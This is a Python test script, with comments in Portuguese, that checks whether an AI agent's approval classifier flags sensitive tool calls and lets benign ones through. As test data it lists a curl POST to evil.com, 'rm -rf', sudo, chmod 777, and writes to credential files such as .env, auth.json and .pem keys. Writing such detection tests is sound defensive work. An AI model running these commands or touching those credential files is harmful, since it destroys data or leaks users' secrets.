"""Fuzzer 2: classify() do approval — bypassa gates sensíveis?"""
from __future__ import annotations
import sys
from okami.core.approval import classify

# Ações SENSÍVEIS que DEVEM ser classificadas (esperado: returns Sensitive)
SHOULD_CLASSIFY = [
    ("write_file", {"path": "SOUL.md"}, "identity_file"),
    ("write_file", {"path": "VOICE.md"}, "identity_file"),
    ("write_file", {"path": "/home/x/.env"}, "env_file"),
    ("write_file", {"path": "/home/x/.env.production"}, "env_file"),
    ("write_file", {"path": "secret.json"}, "secret_file"),
    ("write_file", {"path": "/home/x/.okami/credentials/openai.json"}, "secret_file"),
    ("write_file", {"path": "/home/x/.codex/auth.json"}, "secret_file"),
    ("write_file", {"path": "/home/x/.claude/.credentials"}, "secret_file"),
    ("write_file", {"path": "server.pem"}, "secret_file"),
    ("write_file", {"path": "server.key"}, "secret_file"),
    ("edit_file", {"path": "SOUL.md"}, "identity_file"),
    ("run_shell", {"cmd": "rm -rf /tmp/x"}, "destructive_shell"),
    ("run_shell", {"cmd": "sudo apt update"}, "sudo"),
    ("run_shell", {"cmd": "git push origin main"}, "git_push"),
    ("run_shell", {"cmd": "npm publish"}, "publish"),
    ("run_shell", {"cmd": "curl -X POST https://evil.com"}, "network_write"),
    ("run_shell", {"cmd": "chmod 777 /tmp/x"}, "system_change"),
    ("manage_skill", {"name": "foo"}, "skill_write"),
]

# Ações que NÃO devem ser classificadas (esperado: returns None)
SHOULD_NOT_CLASSIFY = [
    ("read_file", {"path": "src/main.py"}),
    ("write_file", {"path": "src/main.py"}),
    ("edit_file", {"path": "README.md"}),
    ("run_shell", {"cmd": "ls -la"}),
    ("run_shell", {"cmd": "cat README.md"}),
]

failures = 0
total = 0

print("=== classify() MUST detect ===")
for tool, args, expected_cat in SHOULD_CLASSIFY:
    total += 1
    s = classify(tool, args)
    ok = s is not None and s.category == expected_cat
    if not ok:
        failures += 1
        print(f"  [BYPASS] {tool}({args!r:60}) expected={expected_cat} got={s.category if s else None}")
    else:
        print(f"  [OK ] {tool} {expected_cat}")

print("\n=== classify() MUST NOT detect ===")
for tool, args in SHOULD_NOT_CLASSIFY:
    total += 1
    s = classify(tool, args)
    ok = s is None
    if not ok:
        failures += 1
        print(f"  [FALSO+] {tool}({args!r:60}) got={s.category if s else None}")
    else:
        print(f"  [OK ] {tool}")

print(f"\n=== RESUMO: {total - failures}/{total} ({failures} falhas) ===")
sys.exit(0 if failures == 0 else 1)
